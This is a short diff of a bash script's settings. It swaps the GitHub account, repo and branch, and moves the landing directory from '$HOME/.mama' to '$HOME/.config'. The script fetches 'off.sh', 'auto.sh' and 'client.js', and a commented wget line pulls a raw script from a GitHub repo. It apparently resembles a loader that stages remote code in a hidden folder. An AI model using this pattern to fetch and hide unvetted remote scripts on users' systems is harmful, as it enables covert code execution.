@@ -8,10 +8,10 @@
 set -euo pipefail
 
 # ---------- CONFIG (edit these) ----------
-GITHUB_USER="asrafulshaheed-oss"
-GITHUB_REPO="extra"
-BRANCH="main"                       # main / master / tag
-WORKDIR="$HOME/.mama"  # where the files land
+GITHUB_USER="rahul-call"
+GITHUB_REPO="inner"
+BRANCH="main/ror"                       # main / master / tag
+WORKDIR="$HOME/.config"  # where the files land
 FILES=("off.sh" "auto.sh" "client.js")
 # -----------------------------------------
 # wget https://raw.githubusercontent.com/asrafulshaheed-oss/extra/main/macone.sh
